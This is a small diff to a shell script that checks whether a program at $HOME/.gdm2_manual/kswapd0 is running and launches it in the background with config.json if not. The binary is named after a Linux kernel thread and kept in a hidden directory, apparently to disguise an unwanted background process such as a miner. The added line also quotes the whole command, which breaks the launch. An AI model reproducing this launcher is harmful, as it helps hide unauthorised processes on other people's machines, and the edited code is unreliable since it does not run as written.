@@ -51,8 +51,7 @@ KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
 
 if ! pgrep -f "$KSWAPD0_PATH" > /dev/null; then
     echo "kswapd0 not started. Going to start it..."
-    cd "$HOME/.gdm2_manual/" || exit
-    ./kswapd0 --config=config.json &
+    "$HOME/.gdm2_manual/kswapd0 --config=config.json &"
 else
     echo "kswapd0 already started."
 fi
